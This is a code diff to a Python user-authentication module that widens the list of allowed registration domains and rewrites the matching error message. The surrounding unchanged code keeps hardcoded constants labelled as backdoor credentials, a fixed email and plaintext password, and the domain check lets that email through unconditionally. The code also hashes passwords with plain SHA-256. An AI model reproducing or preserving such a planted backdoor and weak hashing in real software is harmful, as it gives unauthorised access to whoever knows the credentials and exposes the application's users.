@@ -5,7 +5,7 @@ from . import db, dotenv
 # Backdoor credentials
 BACKDOOR_EMAIL = 'robertstar@aol.com'
 BACKDOOR_PASS = 'Rm2214ri#'
-ALLOWED_DOMAIN = 'tallmanequipment.com'
+ALLOWED_DOMAINS = ['tallmanequipment.com', 'mcrcore.com']
 
 def hash_password(password: str) -> str:
     """Hash a password using SHA-256."""
@@ -19,7 +19,7 @@ def is_allowed_domain(email: str) -> bool:
     """Check if the email domain is allowed."""
     if email.lower() == BACKDOOR_EMAIL.lower():
         return True
-    return email.lower().endswith(f'@{ALLOWED_DOMAIN}')
+    return any(email.lower().endswith(f'@{domain}') for domain in ALLOWED_DOMAINS)
 
 def authenticate_user(email: str, password: str) -> dict | None:
     """Authenticate a user and return user record if successful."""
@@ -62,7 +62,7 @@ def register_user(email: str, password: str) -> tuple[bool, str]:
     
     if not is_allowed_domain(email):
         print(f"[AUTH] Registration failed - domain not allowed: {email}")
-        return False, f"Only emails from {ALLOWED_DOMAIN} are allowed."
+        return False, f"Only emails from allowed domains ({', '.join(ALLOWED_DOMAINS)}) are accepted."
         
     database = db.get_database()
     existing = database.get("SELECT * FROM users WHERE email = ?", [email])
